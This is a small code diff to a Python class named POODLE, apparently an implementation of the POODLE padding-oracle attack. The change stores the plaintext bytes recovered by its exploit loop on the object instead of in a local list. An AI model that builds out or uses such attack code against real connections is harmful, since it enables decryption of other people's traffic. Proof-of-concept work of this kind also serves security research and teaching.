@@ -12,6 +12,7 @@ class POODLE(object):
     self.was_error = False
     self.was_success = False
     self.message = None
+    self.plaintext = []
     return
 
   def mark_error(self):
@@ -30,11 +31,10 @@ class POODLE(object):
     return
 
   def exploit(self):
-    plaintext = []
     for block in range(1, self.recovery_length / self.block_size):
       for i in reversed(range(self.block_size)):
         plain = self.find_byte(block, i)
-        plaintext.append(plain)
+        self.plaintext.append(plain)
     return
 
   def find_byte(self, block, byte):
